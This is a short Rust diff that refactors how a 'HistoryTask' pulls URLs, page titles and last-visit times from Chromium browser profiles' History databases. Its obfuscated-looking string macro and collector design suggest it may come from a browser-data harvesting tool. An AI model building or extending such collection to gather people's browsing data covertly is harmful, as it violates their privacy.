@@ -1,6 +1,6 @@
 use crate::alloc::borrow::ToOwned;
 use crate::chromium::BrowserData;
-use crate::{History, SqliteDatabase, read_and_collect_unique_records, to_string_and_write_all, Extract};
+use crate::{History, SqliteDatabase, read_and_collect_unique_records, to_string_and_write_all, Extract, ExtractExt};
 use alloc::sync::Arc;
 use derive_new::new;
 use collector::{Browser, Collector};
@@ -29,7 +29,7 @@ impl<C: Collector, F: FileSystem> Task<C, F> for HistoryTask {
             &StorageFileSystem,
             |profile| profile / s!("History"),
             s!("Urls"),
-            |record| History::extract(record, (URLS_URL, URLS_TITLE, URLS_LAST_VISIT_TIME)),
+            History::make_extractor((URLS_URL, URLS_TITLE, URLS_LAST_VISIT_TIME)),
         ) else {
             return;
         };
